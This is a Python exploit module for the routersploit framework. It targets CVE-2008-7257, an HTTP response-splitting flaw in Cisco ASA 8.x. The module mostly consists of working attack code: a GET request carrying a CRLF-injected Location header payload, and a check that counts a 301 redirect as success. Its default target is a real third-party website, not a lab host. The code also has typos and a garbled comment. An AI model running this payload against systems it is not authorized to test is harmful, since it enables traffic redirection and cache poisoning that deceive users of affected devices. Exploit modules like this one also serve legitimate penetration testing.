# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    This exploit targets a vulnerability in the Cisco ASA HTTP Server.
    Cisco Bugid CSCsr09163.
    By sending a GET request for the url. Attackers can leverage this
    issue to influence or misrepresent how web content is served, cached,
    or interpreted. This could aid in various attacks that try to entice
    client users into having a false sense of trust.
    """
    __info__ = {
        'name': 'Cisco ASA 8.x HTTP response-splitting',
        'description': ['HTTP server for Cisco ASA prior 812 allows attackers leverage this issue to \n'
                        'influence or misrepresent how web content is served, cached, or interpreted. \n'
                        'This could aid in various attacks that try to notice client users into having \n'
                        'a false sense of trust.',
                        ],
        'authors': [
            'Daniel King' 
        ],
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2008-7257',
        ],
        'devices': [
            'Cisco ASA Firmware Prior 8.0 or 8.1(2)',
        ],
        'id': 'CVE-2008-7257',
    }

    target = exploits.Option('www.baidu.com', 'Target address e.g. http://192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    http_header_inj = exploits.Option('%0d%0aLocation%3a%20http%3a%2f%2fwww%2egoogle%2ecom',
                                      'Inject Header (redirect)')
    response = None

    # TODO: UNITEST - FUNC TEST - CASE 04 -- Exploit Test
    def run(self):
        executed = self.check()
        if executed:
            if self.response is None:
                print_error("Target HTTP Service may temporary unavailable!")  # target is not vulnerable
                return False
            else:
                print_success("Target is VULNERABLE!")
                return True
        else:
            print_error("Target may not in suffer")
            return False

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 03 -- Check func test
        url = "{}:{}/{}".format(self.target, self.port, self.http_header_inj)
        try:
            self.response = http_request(method="GET", url=url)
        except Exception:
            print_status("Something go wrong...Oops")
            return False
        if self.response:
            # TODOï¼š Capture response data
            if self.response.status == 301:
                return True
            else:
                return False

        return False  # target is not vulnerable
